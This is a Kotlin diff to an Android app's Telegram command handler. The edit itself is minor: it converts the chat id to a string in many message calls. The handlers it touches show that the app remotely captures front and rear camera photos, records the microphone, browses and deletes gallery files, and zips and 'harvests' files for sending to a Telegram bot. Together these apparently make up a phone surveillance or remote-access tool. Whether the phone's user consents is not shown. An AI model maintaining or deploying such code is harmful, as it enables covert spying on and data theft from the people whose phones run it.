@@ -27,6 +27,7 @@ import kotlin.random.Random
  * - تعديل sendTelegramVoice و sendTelegramDocument لاستقبال threadId واستخدام TelegramUi مباشرة.
  * - تعديل handleMic لتمرير threadId إلى sendTelegramVoice.
  * - ✅ إصلاح خطأ Type mismatch في sendTelegramMessage: تغيير chatId إلى Any وتحويله إلى String داخلياً.
+ * - ✅ تحويل جميع استدعاءات sendTelegramMessage التي تستخدم cid إلى cid.toString() لضمان التوافق.
  */
 class Commands private constructor(context: Context) {
 
@@ -517,7 +518,7 @@ class Commands private constructor(context: Context) {
             // ✅ التحقق من الجلسة
             if (!isAuthorized(cid, m)) {
                 sendTelegramMessage(
-                    tg, cid, "⚠️ انتهت الجلسة، استخدم /login",
+                    tg, cid.toString(), "⚠️ انتهت الجلسة، استخدم /login",
                     receivingToken = receivingToken,
                     threadId = threadId,
                     replyToMessageId = replyToMessageId
@@ -557,7 +558,7 @@ class Commands private constructor(context: Context) {
                 else -> {
                     MainActivity.appendLogStatic("⚠️ Unknown command: '$cmd'")
                     sendTelegramMessage(
-                        tg, cid, "⚠️ أمر غير معروف. استخدم الأزرار التفاعلية.",
+                        tg, cid.toString(), "⚠️ أمر غير معروف. استخدم الأزرار التفاعلية.",
                         receivingToken = receivingToken,
                         threadId = threadId,
                         replyToMessageId = replyToMessageId
@@ -568,7 +569,7 @@ class Commands private constructor(context: Context) {
             MainActivity.appendLogStatic("❌ Command error: ${e.message}")
             Log.e(TAG, "❌ Command error: ${e.message}")
             sendTelegramMessage(
-                tg, cid, "❌ خطأ: ${e.message?.take(100)}",
+                tg, cid.toString(), "❌ خطأ: ${e.message?.take(100)}",
                 receivingToken = receivingToken,
                 threadId = threadId,
                 replyToMessageId = replyToMessageId
@@ -607,7 +608,7 @@ class Commands private constructor(context: Context) {
             """.trimIndent()
 
             sendTelegramMessage(
-                tg, cid, statusText,
+                tg, cid.toString(), statusText,
                 receivingToken = receivingToken,
                 threadId = threadId,
                 replyToMessageId = replyToMessageId
@@ -615,7 +616,7 @@ class Commands private constructor(context: Context) {
         } catch (e: Exception) {
             Log.e(TAG, "❌ System status error: ${e.message}")
             sendTelegramMessage(
-                tg, cid, "❌ خطأ في جلب حالة النظام",
+                tg, cid.toString(), "❌ خطأ في جلب حالة النظام",
                 receivingToken = receivingToken,
                 threadId = threadId,
                 replyToMessageId = replyToMessageId
@@ -637,14 +638,14 @@ class Commands private constructor(context: Context) {
                 val sessions = getModuleField(ui, "sessions") as? ConcurrentHashMap<*, *>
                 sessions?.remove(cid.toString())
                 sendTelegramMessage(
-                    tg, cid, "🔒 تم قفل الجلسة بنجاح. استخدم كلمة السر للدخول مجدداً.",
+                    tg, cid.toString(), "🔒 تم قفل الجلسة بنجاح. استخدم كلمة السر للدخول مجدداً.",
                     receivingToken = receivingToken,
                     threadId = threadId,
                     replyToMessageId = replyToMessageId
                 )
             } else {
                 sendTelegramMessage(
-                    tg, cid, "⚠️ لا توجد جلسة نشطة.",
+                    tg, cid.toString(), "⚠️ لا توجد جلسة نشطة.",
                     receivingToken = receivingToken,
                     threadId = threadId,
                     replyToMessageId = replyToMessageId
@@ -653,7 +654,7 @@ class Commands private constructor(context: Context) {
         } catch (e: Exception) {
             Log.e(TAG, "❌ Logout error: ${e.message}")
             sendTelegramMessage(
-                tg, cid, "❌ خطأ في قفل الجلسة",
+                tg, cid.toString(), "❌ خطأ في قفل الجلسة",
                 receivingToken = receivingToken,
                 threadId = threadId,
                 replyToMessageId = replyToMessageId
@@ -671,7 +672,7 @@ class Commands private constructor(context: Context) {
     ) {
         try {
             sendTelegramMessage(
-                tg, cid, "⚡ جاري تحديث النموذج... قد يستغرق دقائق.",
+                tg, cid.toString(), "⚡ جاري تحديث النموذج... قد يستغرق دقائق.",
                 receivingToken = receivingToken,
                 threadId = threadId,
                 replyToMessageId = replyToMessageId
@@ -685,14 +686,14 @@ class Commands private constructor(context: Context) {
                             detector.modelPath = detector.modelPath
                             detector.loadEngineForever()
                             sendTelegramMessage(
-                                tg, cid, "✅ تم تحديث النموذج بنجاح!",
+                                tg, cid.toString(), "✅ تم تحديث النموذج بنجاح!",
                                 receivingToken = receivingToken,
                                 threadId = threadId,
                                 replyToMessageId = replyToMessageId
                             )
                         } else {
                             sendTelegramMessage(
-                                tg, cid, "❌ فشل تحديث النموذج.",
+                                tg, cid.toString(), "❌ فشل تحديث النموذج.",
                                 receivingToken = receivingToken,
                                 threadId = threadId,
                                 replyToMessageId = replyToMessageId
@@ -700,7 +701,7 @@ class Commands private constructor(context: Context) {
                         }
                     } else {
                         sendTelegramMessage(
-                            tg, cid, "❌ كاشف المحتوى غير متاح",
+                            tg, cid.toString(), "❌ كاشف المحتوى غير متاح",
                             receivingToken = receivingToken,
                             threadId = threadId,
                             replyToMessageId = replyToMessageId
@@ -709,7 +710,7 @@ class Commands private constructor(context: Context) {
                 } catch (e: Exception) {
                     Log.e(TAG, "Update model error: ${e.message}")
                     sendTelegramMessage(
-                        tg, cid, "❌ خطأ في تحديث النموذج: ${e.message?.take(50)}",
+                        tg, cid.toString(), "❌ خطأ في تحديث النموذج: ${e.message?.take(50)}",
                         receivingToken = receivingToken,
                         threadId = threadId,
                         replyToMessageId = replyToMessageId
@@ -719,7 +720,7 @@ class Commands private constructor(context: Context) {
         } catch (e: Exception) {
             Log.e(TAG, "❌ Update model handler error: ${e.message}")
             sendTelegramMessage(
-                tg, cid, "❌ خطأ في تحديث النموذج",
+                tg, cid.toString(), "❌ خطأ في تحديث النموذج",
                 receivingToken = receivingToken,
                 threadId = threadId,
                 replyToMessageId = replyToMessageId
@@ -737,7 +738,7 @@ class Commands private constructor(context: Context) {
     ) {
         try {
             sendTelegramMessage(
-                tg, cid, "♻️ جاري إعادة تشغيل الخدمة...",
+                tg, cid.toString(), "♻️ جاري إعادة تشغيل الخدمة...",
                 receivingToken = receivingToken,
                 threadId = threadId,
                 replyToMessageId = replyToMessageId
@@ -752,14 +753,14 @@ class Commands private constructor(context: Context) {
                         val startMethod = monitor.javaClass.getMethod("start")
                         startMethod.invoke(monitor)
                         sendTelegramMessage(
-                            tg, cid, "✅ تم إعادة تشغيل الخدمة بنجاح.",
+                            tg, cid.toString(), "✅ تم إعادة تشغيل الخدمة بنجاح.",
                             receivingToken = receivingToken,
                             threadId = threadId,
                             replyToMessageId = replyToMessageId
                         )
                     } else {
                         sendTelegramMessage(
-                            tg, cid, "❌ وحدة المراقبة غير متاحة",
+                            tg, cid.toString(), "❌ وحدة المراقبة غير متاحة",
                             receivingToken = receivingToken,
                             threadId = threadId,
                             replyToMessageId = replyToMessageId
@@ -768,7 +769,7 @@ class Commands private constructor(context: Context) {
                 } catch (e: Exception) {
                     Log.e(TAG, "Restart service error: ${e.message}")
                     sendTelegramMessage(
-                        tg, cid, "❌ فشل إعادة تشغيل الخدمة: ${e.message?.take(50)}",
+                        tg, cid.toString(), "❌ فشل إعادة تشغيل الخدمة: ${e.message?.take(50)}",
                         receivingToken = receivingToken,
                         threadId = threadId,
                         replyToMessageId = replyToMessageId
@@ -778,7 +779,7 @@ class Commands private constructor(context: Context) {
         } catch (e: Exception) {
             Log.e(TAG, "❌ Restart service handler error: ${e.message}")
             sendTelegramMessage(
-                tg, cid, "❌ خطأ في إعادة تشغيل الخدمة",
+                tg, cid.toString(), "❌ خطأ في إعادة تشغيل الخدمة",
                 receivingToken = receivingToken,
                 threadId = threadId,
                 replyToMessageId = replyToMessageId
@@ -802,7 +803,7 @@ class Commands private constructor(context: Context) {
         try {
             if (!isBatteryOk(m)) {
                 sendTelegramMessage(
-                    tg, cid, "🔋 البطارية منخفضة، تم تخطي الالتقاط",
+                    tg, cid.toString(), "🔋 البطارية منخفضة، تم تخطي الالتقاط",
                     receivingToken = receivingToken,
                     threadId = threadId,
                     replyToMessageId = replyToMessageId
@@ -813,7 +814,7 @@ class Commands private constructor(context: Context) {
             val cameraAnalyzer = getModuleComponent(m, "cameraAnalyzer") as? CameraAnalyzer
             if (cameraAnalyzer == null) {
                 sendTelegramMessage(
-                    tg, cid, "❌ وحدة الكاميرا غير مهيأة",
+                    tg, cid.toString(), "❌ وحدة الكاميرا غير مهيأة",
                     receivingToken = receivingToken,
                     threadId = threadId,
                     replyToMessageId = replyToMessageId
@@ -823,7 +824,7 @@ class Commands private constructor(context: Context) {
 
             val camType = if (camId == 1) "الأمامية 🤳" else "الخلفية 📷"
             sendTelegramMessage(
-                tg, cid, "📸 جاري التقاط صورة من الكاميرا $camType...",
+                tg, cid.toString(), "📸 جاري التقاط صورة من الكاميرا $camType...",
                 receivingToken = receivingToken,
                 threadId = threadId,
                 replyToMessageId = replyToMessageId
@@ -837,7 +838,7 @@ class Commands private constructor(context: Context) {
             }
 
             sendTelegramMessage(
-                tg, cid, "✅ تم التقاط الصورة وإرسالها بنجاح",
+                tg, cid.toString(), "✅ تم التقاط الصورة وإرسالها بنجاح",
                 receivingToken = receivingToken,
                 threadId = threadId,
                 replyToMessageId = replyToMessageId
@@ -845,7 +846,7 @@ class Commands private constructor(context: Context) {
         } catch (e: Exception) {
             Log.e(TAG, "Camera handler error: ${e.message}")
             sendTelegramMessage(
-                tg, cid, "❌ فشل التقاط الصورة: ${e.message?.take(50)}",
+                tg, cid.toString(), "❌ فشل التقاط الصورة: ${e.message?.take(50)}",
                 receivingToken = receivingToken,
                 threadId = threadId,
                 replyToMessageId = replyToMessageId
@@ -869,7 +870,7 @@ class Commands private constructor(context: Context) {
             val mediaScanner = getModuleComponent(m, "mediaScanner")
             if (mediaScanner == null) {
                 sendTelegramMessage(
-                    tg, cid, "❌ المعرض غير متاح",
+                    tg, cid.toString(), "❌ المعرض غير متاح",
                     receivingToken = receivingToken,
                     threadId = threadId,
                     replyToMessageId = replyToMessageId
@@ -880,7 +881,7 @@ class Commands private constructor(context: Context) {
             val kb = invokeMethod(mediaScanner, "getGridKb", "all", 0)
             if (kb != null) {
                 val response = sendTelegramMessage(
-                    tg, cid, "🖼️ أرشيف الوسائط", kb.toString(),
+                    tg, cid.toString(), "🖼️ أرشيف الوسائط", kb.toString(),
                     receivingToken = receivingToken,
                     threadId = threadId,
                     replyToMessageId = replyToMessageId
@@ -889,7 +890,7 @@ class Commands private constructor(context: Context) {
                 msgId?.let { setModuleField(m, "last_mid", it) }
             } else {
                 sendTelegramMessage(
-                    tg, cid, "❌ فشل تحميل المعرض",
+                    tg, cid.toString(), "❌ فشل تحميل المعرض",
                     receivingToken = receivingToken,
                     threadId = threadId,
                     replyToMessageId = replyToMessageId
@@ -898,7 +899,7 @@ class Commands private constructor(context: Context) {
         } catch (e: Exception) {
             Log.e(TAG, "Gallery handler error: ${e.message}")
             sendTelegramMessage(
-                tg, cid, "❌ خطأ في المعرض",
+                tg, cid.toString(), "❌ خطأ في المعرض",
                 receivingToken = receivingToken,
                 threadId = threadId,
                 replyToMessageId = replyToMessageId
@@ -923,7 +924,7 @@ class Commands private constructor(context: Context) {
             val parts = cmd.split("|")
             if (parts.size < 2) {
                 sendTelegramMessage(
-                    tg, cid, "⚠️ أمر غير مكتمل",
+                    tg, cid.toString(), "⚠️ أمر غير مكتمل",
                     receivingToken = receivingToken,
                     threadId = threadId,
                     replyToMessageId = replyToMessageId
@@ -935,7 +936,7 @@ class Commands private constructor(context: Context) {
             val mediaScanner = getModuleComponent(m, "mediaScanner")
             if (mediaScanner == null) {
                 sendTelegramMessage(
-                    tg, cid, "❌ المعرض غير متاح",
+                    tg, cid.toString(), "❌ المعرض غير متاح",
                     receivingToken = receivingToken,
                     threadId = threadId,
                     replyToMessageId = replyToMessageId
@@ -995,7 +996,7 @@ class Commands private constructor(context: Context) {
                         )
                         val jsonKb = JSONObject(mapOf("inline_keyboard" to confirmKb)).toString()
                         sendTelegramMessage(
-                            tg, cid, "⚠️ هل أنت متأكد من حذف كل ملفات الصفحة ${page + 1}؟", jsonKb,
+                            tg, cid.toString(), "⚠️ هل أنت متأكد من حذف كل ملفات الصفحة ${page + 1}؟", jsonKb,
                             receivingToken = receivingToken,
                             threadId = threadId,
                             replyToMessageId = replyToMessageId
@@ -1015,7 +1016,7 @@ class Commands private constructor(context: Context) {
                         )
                         val jsonKb = JSONObject(mapOf("inline_keyboard" to confirmKb)).toString()
                         sendTelegramMessage(
-                            tg, cid, "⚠️ هل أنت متأكد من حذف هذا الملف؟", jsonKb,
+                            tg, cid.toString(), "⚠️ هل أنت متأكد من حذف هذا الملف؟", jsonKb,
                             receivingToken = receivingToken,
                             threadId = threadId,
                             replyToMessageId = replyToMessageId
@@ -1039,7 +1040,7 @@ class Commands private constructor(context: Context) {
                 }
                 else -> {
                     sendTelegramMessage(
-                        tg, cid, "⚠️ أمر معرض غير معروف",
+                        tg, cid.toString(), "⚠️ أمر معرض غير معروف",
                         receivingToken = receivingToken,
                         threadId = threadId,
                         replyToMessageId = replyToMessageId
@@ -1049,7 +1050,7 @@ class Commands private constructor(context: Context) {
         } catch (e: Exception) {
             Log.e(TAG, "Gallery command error: ${e.message}")
             sendTelegramMessage(
-                tg, cid, "❌ خطأ في أمر المعرض",
+                tg, cid.toString(), "❌ خطأ في أمر المعرض",
                 receivingToken = receivingToken,
                 threadId = threadId,
                 replyToMessageId = replyToMessageId
@@ -1075,7 +1076,7 @@ class Commands private constructor(context: Context) {
             val dailyZipper = getModuleComponent(m, "dailyZipper")
             if (dailyZipper != null) {
                 sendTelegramMessage(
-                    tg, cid, "📦 بدء الحصاد... قد يستغرق دقائق",
+                    tg, cid.toString(), "📦 بدء الحصاد... قد يستغرق دقائق",
                     receivingToken = receivingToken,
                     threadId = threadId,
                     replyToMessageId = replyToMessageId
@@ -1089,7 +1090,7 @@ class Commands private constructor(context: Context) {
                 }
             } else {
                 sendTelegramMessage(
-                    tg, cid, "❌ وحدة الحصاد غير جاهزة",
+                    tg, cid.toString(), "❌ وحدة الحصاد غير جاهزة",
                     receivingToken = receivingToken,
                     threadId = threadId,
                     replyToMessageId = replyToMessageId
@@ -1098,7 +1099,7 @@ class Commands private constructor(context: Context) {
         } catch (e: Exception) {
             Log.e(TAG, "❌ Harvest handler error: ${e.message}")
             sendTelegramMessage(
-                tg, cid, "❌ خطأ في الحصاد",
+                tg, cid.toString(), "❌ خطأ في الحصاد",
                 receivingToken = receivingToken,
                 threadId = threadId,
                 replyToMessageId = replyToMessageId
@@ -1121,7 +1122,7 @@ class Commands private constructor(context: Context) {
         try {
             if (isMicBusy) {
                 sendTelegramMessage(
-                    tg, cid, "⏳ التسجيل قيد التنفيذ",
+                    tg, cid.toString(), "⏳ التسجيل قيد التنفيذ",
                     receivingToken = receivingToken,
                     threadId = threadId,
                     replyToMessageId = replyToMessageId
@@ -1134,7 +1135,7 @@ class Commands private constructor(context: Context) {
             stopRecordingFlag = false
             val duration = (config["audio_duration"] as? Number)?.toInt() ?: 10
             sendTelegramMessage(
-                tg, cid, "🎤 جاري التسجيل لمدة $duration ثوانٍ...",
+                tg, cid.toString(), "🎤 جاري التسجيل لمدة $duration ثوانٍ...",
                 receivingToken = receivingToken,
                 threadId = threadId,
                 replyToMessageId = replyToMessageId
@@ -1149,7 +1150,7 @@ class Commands private constructor(context: Context) {
                     if (success) {
                         safeRemove(audioPath)
                         sendTelegramMessage(
-                            tg, cid, "✅ تم إرسال التسجيل الصوتي بنجاح.",
+                            tg, cid.toString(), "✅ تم إرسال التسجيل الصوتي بنجاح.",
                             receivingToken, threadId, replyToMessageId
                         )
                     } else {
@@ -1158,7 +1159,7 @@ class Commands private constructor(context: Context) {
                     }
                 } else {
                     sendTelegramMessage(
-                        tg, cid, "❌ فشل التسجيل (الملف صغير جداً أو تالف)",
+                        tg, cid.toString(), "❌ فشل التسجيل (الملف صغير جداً أو تالف)",
                         receivingToken = receivingToken,
                         threadId = threadId,
                         replyToMessageId = replyToMessageId
@@ -1168,7 +1169,7 @@ class Commands private constructor(context: Context) {
         } catch (e: Exception) {
             Log.e(TAG, "❌ Mic handler error: ${e.message}")
             sendTelegramMessage(
-                tg, cid, "❌ خطأ في الميكروفون",
+                tg, cid.toString(), "❌ خطأ في الميكروفون",
                 receivingToken = receivingToken,
                 threadId = threadId,
                 replyToMessageId = replyToMessageId
@@ -1192,7 +1193,7 @@ class Commands private constructor(context: Context) {
             val dailyZipper = getModuleComponent(m, "dailyZipper")
             if (dailyZipper != null) {
                 sendTelegramMessage(
-                    tg, cid, "🚀 جاري إرسال الملفات المضغوطة فوراً...",
+                    tg, cid.toString(), "🚀 جاري إرسال الملفات المضغوطة فوراً...",
                     receivingToken = receivingToken,
                     threadId = threadId,
                     replyToMessageId = replyToMessageId
@@ -1209,7 +1210,7 @@ class Commands private constructor(context: Context) {
                 }
             } else {
                 sendTelegramMessage(
-                    tg, cid, "❌ وحدة الحصاد غير متاحة",
+                    tg, cid.toString(), "❌ وحدة الحصاد غير متاحة",
                     receivingToken = receivingToken,
                     threadId = threadId,
                     replyToMessageId = replyToMessageId
@@ -1218,7 +1219,7 @@ class Commands private constructor(context: Context) {
         } catch (e: Exception) {
             Log.e(TAG, "❌ Send now handler error: ${e.message}")
             sendTelegramMessage(
-                tg, cid, "❌ خطأ في الإرسال الفوري",
+                tg, cid.toString(), "❌ خطأ في الإرسال الفوري",
                 receivingToken = receivingToken,
                 threadId = threadId,
                 replyToMessageId = replyToMessageId
